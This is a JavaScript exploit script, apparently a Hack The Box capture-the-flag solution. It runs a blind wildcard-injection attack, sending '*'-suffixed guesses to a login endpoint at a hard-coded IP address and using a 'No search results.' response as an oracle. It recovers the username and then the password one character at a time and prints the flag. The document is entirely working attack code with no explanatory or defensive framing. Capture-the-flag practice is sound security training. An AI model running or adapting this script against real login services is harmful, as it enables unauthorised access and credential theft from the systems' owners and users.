var condition = 'No search results.';
var string = ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "[", "^", "_", "`", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "{", "|", "}", "~"]
var username = '';
var password = 'HTB{';

(async function (){
    console.log('[*] Exploit');
    for (let i = 0; i < 5; i++){
        for(let j = 0; j < string.length; j++){
            var result = '';
            c = username + string[j] + '*';
            await fetch('http://159.65.50.127:31179/login',{
                method: 'POST',
                headers: {
                    'Content-Type':'application/x-www-form-urlencoded'
                },
                body: `username=${c}&password=*`
            }).then((x) => x.text()).then((x) => result=x);
            if (result.indexOf(condition) != -1){
                username += string[j];
                console.log(`[*] username : ${username}`);
                break;
            }
        }
    }

    for (let i = 0; i < 100; i++){
        for(let j = 0; j < string.length; j++){
            var result = ''
            c = password + string[j] + '*';
            await fetch('http://159.65.50.127:31179/login',{
                method: 'POST',
                headers: {
                    'Content-Type':'application/x-www-form-urlencoded'
                },
                body: `username=${username}&password=${c}`
            }).then((x) => x.text()).then((x) => result=x);
            if (result.indexOf(condition) != -1){
                password += string[j];
                console.log(`[*] password : ${password}`);
                break;
            }
        }
    }
    console.log(`[*] The flag is ${password}`);
})();
